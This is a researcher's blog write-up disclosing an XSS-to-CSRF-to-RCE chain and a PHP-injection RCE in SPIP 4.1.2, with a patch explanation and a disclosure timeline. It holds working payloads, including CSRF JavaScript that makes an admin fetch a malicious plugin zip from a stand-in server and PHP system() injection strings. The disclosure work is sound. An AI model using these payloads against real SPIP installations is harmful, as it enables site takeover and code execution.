---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-07-12_how-we-have-pwned-root-me-in-2022.md
original_filename: 2022-07-12_how-we-have-pwned-root-me-in-2022.md
title: How we have pwned Root-Me in 2022
category: documents
detected_topics:
- xss
- sqli
- command-injection
- otp
- csrf
- mobile-security
tags:
- imported
- documents
- xss
- sqli
- command-injection
- otp
- csrf
- mobile-security
language: en
raw_sha256: 7d24d31bab5ddc74c216f87431056aebef70b02eeae079a594c0113efe662b84
text_sha256: f787322cb3425fde50c619ce0eaac8b26d1efe448f0cf42150b4df9303e5f476
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: true
---

# How we have pwned Root-Me in 2022

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-07-12_how-we-have-pwned-root-me-in-2022.md
- Source Type: markdown
- Detected Topics: xss, sqli, command-injection, otp, csrf, mobile-security
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: True
- Raw SHA256: `7d24d31bab5ddc74c216f87431056aebef70b02eeae079a594c0113efe662b84`
- Text SHA256: `f787322cb3425fde50c619ce0eaac8b26d1efe448f0cf42150b4df9303e5f476`


## Content

---
title: "How we have pwned Root-Me in 2022"
page_title: "How we have pwned Root-Me in 2022 :: SpawnZii"
url: "https://spawnzii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/"
final_url: "https://spawnzii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/"
authors: ["Romain Brun (@SpawnZii)", "Abyss Watcher"]
programs: ["SPIP"]
bugs: ["XSS", "CSRF", "RCE"]
publication_date: "2022-07-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2468
---

#  [How we have pwned Root-Me in 2022](https://SpawnZii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/)

## Introduction

Hello, I’m currently a student at ESNA and I’m passionate about web application security. This article describes the discovery of several critical vulnerabilities in the SPIP CMS and [Root-Me](https://www.root-me.org/).

With a friend (cc [Abyss Watcher](https://github.com/Abyss-W4tcher)) we decided to search for vulnerabilities on the SPIP/Root-Me. From the first days, we managed to find some bugs, XSS, CSRF and later we will discover a RCE.

## Environment

Of course we did not our research directly on root me. So we set up a local spip environment.

  * SPIP version 4.1.2 <https://files.spip.net/spip/archives/spip-v4.1.2.zip>
  * [Laluka’s](https://twitter.com/TheLaluka) [docker-compose file](https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/):

  
  
  version: '3.5'
  
  services:
  db:
  image: mysql:5.6
  command: --default-authentication-plugin=mysql_native_password
  environment:
  - MYSQL_ROOT_PASSWORD=***REDACTED***
  ports:
  - 3306:3306
  
  adminer:
  image: adminer
  ports:
  - 81:8080
  
  spip:
  image: php:8.0
  ports:
  - 80:80
  volumes:
  - ./spip:/spip
  working_dir: /spip
  entrypoint: ["bash", "-c", "apt update && apt install -y default-mysql-client && docker-php-ext-install mysqli && apt install -y libzip-dev zip && docker-php-ext-install zip && php -S 0.0.0.0:80"]
  

  * We have also activated the “[parano](https://www.spip.net/fr_article4642.html)” mode, this mode allows to disable the execution of javascript in the articles.

  
  
  // sécuriser les scripts javascript en mode parano
  $GLOBALS['filtrer_javascript'] = -1;
  

## # Bug 1 - A simple XSS to start

After some research I managed to identify a trivial stored XSS. An author can add hyperlink with the following payload `javascript:alert(document.domain)`, So when the user clicks on the link, the javascript will be executed.

![form](/posts/rmrce/pldsimplexss.png)

It’s possible to trigger the xss at several places, on the public part of the site.

![form](/posts/rmrce/publictriggerxss.png)

And on the administration interface.

![form](/posts/rmrce/triggerxss.png)

### XSS to CSRF to RCE ?

Now that we can run javascript several scenarios are possible via.

  * Create a CSRF to take over the users’ accounts.
  * Create a CSRF to elevate our privileges.
  * Create a CSRF to upload a malicious plugin

You guessed it, I chose the last option, for that we will look at a function of spip allowing an administrator to upload a plugin.

![form](/posts/rmrce/manage.png)

This function allows an administrator to upload a plugin in zip format from a remote server, the plugin will be unzip and stored at `/plugins/auto/`. By analyzing the upload request, we notice that two tokens are passed as parameters, fortunately for us, they do not change between two requests

![form](/posts/rmrce/token.png)

It’s time to build our payload !

### Evil plugin setup.

The function to download a plugin waits for a zip file, so we must create our plugins on our remote server.
  
  
  ┌──(spawnzii㉿spawnzii)-[/tmp/websrv]
  └─$ echo '<?php system("id");?>' > spzrce.php  
  
  ┌──(spawnzii㉿spawnzii)-[/tmp/websrv]
  └─$ zip spzrce.zip spzrce.php 
  adding: spzrce.php (stored 0%)
  

Our plugin is ready, we can place it in a listening web server.

### CSRF payload construction.

On the first part we will make a request to get the tokens.
  
  
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://localhost/ecrire/?exec=charger_plugin');
  xhr.responseType = 'document';
  xhr.send();
  xhr.onreadystatechange = function () {
  if (xhr.readyState == 4) {
  token_sign = xhr.response.getElementsByName('formulaire_action_sign')[1].value;
  token_arg = xhr.response.getElementsByName('formulaire_action_args')[1].value;
  token_sign = encodeURIComponent(token_sign);
  token_arg = encodeURIComponent(token_arg);
  }
  }
  

Now that we have our two tokens, we can build the second request to upload a plugin.
  
  
  function csrf_rce() {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://localhost/ecrire/?exec=charger_plugin');
  xhr.responseType = 'document';
  xhr.send();
  
  xhr.onreadystatechange = function () {
  if (xhr.readyState == 4) {
  token_sign = xhr.response.getElementsByName('formulaire_action_sign')[1].value;
  token_arg = xhr.response.getElementsByName('formulaire_action_args')[1].value;
  token_sign = encodeURIComponent(token_sign);
  token_arg = encodeURIComponent(token_arg);
  var xhrr=new XMLHttpRequest();
  xhrr.open('POST', 'http://localhost/ecrire/?exec=charger_plugin', true);
  xhrr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  xhrr.onload = function () {
  console.log(this.responseText);
  }
  xhrr.send(`var_ajax=form&exec=charger_plugin&formulaire_action=charger_plugin_archive&formulaire_action_args=${token_arg}&formulaire_action_sign=${token}&archive=http%3A%2F%2Fyourserver%2Fspzrce.zip&destination=`);
  }
  };
  }
  
  csrf_rce();
  

We just have to encode our payload in base64 and paste it on the hyperlink.

![form](/posts/rmrce/pldcsrf.png)

Now that our payload is ready, all we have to do is wait for an administrator to click on the link to download the plugin.

![form](/posts/rmrce/o.gif#center)

![form](/posts/rmrce/apresclique.png)

We can go to our plugin to see the result.

![form](/posts/rmrce/poc.png)

## # Bug 2 - “On est bon, rien a faire” sounds like RCE

After a few xss found, we wanted to think bigger and we gave ourselves the objective to find a RCE.

A few days later Abyss watcher had the idea to watch the fix of an old vulnerability (cc [Laluka](https://twitter.com/TheLaluka)).

![form](/posts/rmrce/patch.png)

### What happens in the patch ?

Before the patch the `_oups` parameter was passed directly to the `$valeurs` array. Now `_oups` expects a serialized object encoded in base64.

![form](/posts/rmrce/oupscommit.png)

To debug more simply we have added a `print_r` of the variable `$valeurs`. This allows us to see the result of our payload directly on the page.

### It’s time for a bypass

Now what happens if we put a simple string like **http://localhost/ecrire/?exec=article &id_article=1&_oups=notanobject** on `_oups` parameter ?

![form](/posts/rmrce/nv.png)

Nothing, `_oups` is empty.

But now try to inject serialized object, like : `TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9`.

![form](/posts/rmrce/v.png)

The string is reflected several times in the source code.

![form](/posts/rmrce/inj.png)

We can try to inject with **`http://localhost/ecrire/?exec=article&id_article=1&_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'"<h1>inject here</h1>`**

![form](/posts/rmrce/h1.png)

Damnnn, nice we have html/XSS injection. You know what that means ???

Are you remember [the Laluka’s RCE ?](https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/) And if we try to reproduce the same thing. **`http://localhost/ecrire/?exec=article&id_article=1&_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'"<?php system('id');?>`**.

![form](/posts/rmrce/rcepoc.png)

Here we go again …

## Small explanations

![form](/posts/rmrce/mm.jpg)

SPIP uses skeletons, a kind of html template that is used to formalise the rendering of a page. The problem here is that once the skeleton is filled in, it is passed to a function that evaluates the page ([**evaluer_page.php**](https://github.com/spip/SPIP/blob/master/ecrire/public/evaluer_page.php)).

![form](/posts/rmrce/eval.png)

So as we inject into the skeleton (**[editer_lien.html](https://github.com/spip/SPIP/blob/master/prive/formulaires/editer_liens.html)**), once passed into the function **evaluate_page.php** the php is interpreted.

## Patch

This is how oops is managed after the patch. It is now base64 encoded and converted to json. ![form](/posts/rmrce/p1.png)

The whole thing will be passed to the html entities function

![form](/posts/rmrce/p2.png)

## Timeline

  * **2022/07/05 at 3:38 PM** : XSS/CSRF was discovert and report to SPIP.

  * **2022/07/05 at 6:07 PM** : First response of SPIP.

  * **2022/07/12** : New [commit](https://github.com/spip/SPIP/commit/d569096f346f54552ecf2b0f09c2880219288cb3) on spip.

  * **2022/07/12 at 1:13 AM** : Declaration of the RCE to SPIP.

  * **2022/07/12 at 11:18 AM** : First [commit](https://github.com/spip/SPIP/commit/31691fd689234b290db5f6c9cbae9aff06aca74a) to fix the RCE.

  * **2022/07/22** : [New security release](https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html).

## Conclusion & Thanks

It was a great experience to share our research with [Abyss Watcher](https://github.com/Abyss-W4tcher). We are happy to have contributed to the security of SPIP and Root-Me. Many thanks to [Laluka](https://twitter.com/TheLaluka) and [W0rty](https://twitter.com/_worty) for proofreading this article.

![form](/posts/rmrce/sq.jpg)

## References

  * **Abyss Watcher Article** : [https://github.com/Abyss-W4tcher/…](https://github.com/Abyss-W4tcher/ab4yss-wr4iteups/blob/master/SPIP%204.1.2%20Vulnerabilities/SPIP_4.1.2_AUTH_RCE/SPIP_4.1.2_AUTH_RCE_Abyss_Watcher_12_07_22.md)

  * **Laluka’s RCE** : <https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/>

  * **SPIP release** : <https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html>
